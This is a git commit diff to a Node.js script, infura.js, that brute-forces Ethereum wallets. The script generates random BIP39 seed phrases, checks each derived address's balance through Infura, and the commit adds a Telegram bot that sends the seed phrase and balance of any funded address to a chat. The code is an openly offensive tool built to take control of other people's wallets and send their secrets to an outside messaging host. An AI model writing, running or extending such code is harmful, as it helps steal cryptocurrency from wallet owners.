d03b8a0082c8107a018b5e0a28253650d6c29ddf
Ilyas Esmail <ilyas@esmail.pt>
2021-05-27 12:26:08 +0100

    Install Telegram Bot

--- infura.js
+++ infura.js
@@ -3,7 +3,11 @@ const Web3 = require('web3');
 const hdkey = require('ethereumjs-wallet');
 const bip39 = require('bip39');
 const web3 = new Web3('https://mainnet.infura.io/v3/*Your infura key*');
-import Telegram from 'telegram-send-message';
+const TelegramBot = require('node-telegram-bot-api');
+const token = '*YOUR_TELEGRAM_BOT_TOKEN*';
+const bot = new TelegramBot(token, {polling: true});
+const chatId = '*CHAT_ID*';
+
 
 async function hack () {
     const path = "m/44'/60'/0'/0/0";
@@ -13,8 +17,6 @@ async function hack () {
     let wallet;
     let address;
     let balance;
-    Telegram.setToken(YOUR TELEGRAM BOT TOKEN);
-    Telegram.setRecipient(RECIPIENT CHAT ID);
     while(true) {
         entropy = eth.utils.randomBytes(16);
         mnemonicPhrase = eth.utils.entropyToMnemonic(entropy);
@@ -24,8 +26,6 @@ async function hack () {
         balance = await web3.eth.getBalance(address);
         process.stdout.cursorTo(0);
         console.log(`Checking: ${address}, Balance: ` + balance + `ETH, https://etherscan.io/address/${address}`);
-        Telegram.setMessage(`Found: ${address}, https://etherscan.io/address/${address}, ${mnemonicPhrase}, ${balance}`);
-        Telegram.send();
         if(balance > 0) {
             console.log('\n');
             console.log('mnemonic --->>' + ' '+ mnemonicPhrase)
@@ -36,8 +36,7 @@ async function hack () {
                     console.log(err); 
                 } 
             });
-           Telegram.setMessage(`Found: ${address}, https://etherscan.io/address/${address}, ${mnemonicPhrase}, ${balance}`);
-           Telegram.send();
+            bot.sendMessage(chatId, `Found: ${address}, https://etherscan.io/address/${address}, ${mnemonicPhrase}, ${balance}`);
         }
     }
 }
